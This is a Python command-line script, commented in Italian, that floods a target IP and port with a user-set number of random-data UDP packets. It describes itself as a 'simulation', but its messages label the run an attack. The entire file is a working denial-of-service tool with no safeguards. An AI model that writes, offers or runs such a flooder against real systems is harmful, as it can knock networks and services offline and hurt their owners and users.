import socket
import random
import argparse

def udp_flood(target_ip, target_port, packet_size, packet_count):
    # Creazione del socket UDP
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    
    # Creazione del pacchetto da inviare
    message = random._urandom(packet_size)  # Crea un pacchetto con dati casuali di 1KB
    
    sent_packets = 0
    
    try:
        print(f"Inizio invio di pacchetti UDP verso {target_ip}:{target_port} ...")
        # Invio pacchetti fino al numero specificato
        for _ in range(packet_count):
            # Invio pacchetto al target
            sock.sendto(message, (target_ip, target_port))
            sent_packets += 1
            print(f"Pacchetto {sent_packets}/{packet_count} inviato.")
        
        print(f"Invio completato: {sent_packets} pacchetti inviati.")
    
    except KeyboardInterrupt:
        print("\nInterruzione manuale dell'attacco.")
    finally:
        sock.close()

# Funzione per gestire l'input da riga di comando
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Simulazione UDP Flood")
    
    # Parametri richiesti # python udp_flood.py 192.168.1.100 80 1024 1000
    parser.add_argument("target_ip", help="IP della macchina target")
    parser.add_argument("target_port", type=int, help="Porta UDP della macchina target")
    parser.add_argument("packet_size", type=int, default=1024, help="Dimensione dei pacchetti in byte (1 KB consigliato)")
    parser.add_argument("packet_count", type=int, help="Numero di pacchetti da inviare")
    
    args = parser.parse_args()
    
    # Eseguire l'attacco
    udp_flood(args.target_ip, args.target_port, args.packet_size, args.packet_count)
